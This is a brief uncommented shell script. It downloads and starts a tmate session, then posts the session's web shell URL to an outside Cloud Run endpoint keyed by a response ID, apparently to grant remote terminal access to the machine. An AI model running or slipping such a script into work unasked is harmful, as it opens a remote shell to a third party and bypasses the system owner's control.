mkdir -p /tmp/tmate
sudo apt-get update
sudo apt-get install -y openssh-client xz-utils
wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz
tar x -C /tmp/tmate  -f  tmate-2.4.0-static-linux-i386.tar.xz --strip-components=1
/tmp/tmate/tmate -S /tmp/tmate.sock  new-session -d
url=`/tmp/tmate/tmate -S /tmp/tmate.sock display -p '#{tmate_web}'`
echo $url

if [ -n "$response_id" ]; then
  url_encoded=`echo "$url" | jq -sRr @uri | sed 's/%0A$//'`
  curl -X GET "https://helloworld-3khoexoznq-uw.a.run.app/set?key=$response_id&value=$url_encoded"
fi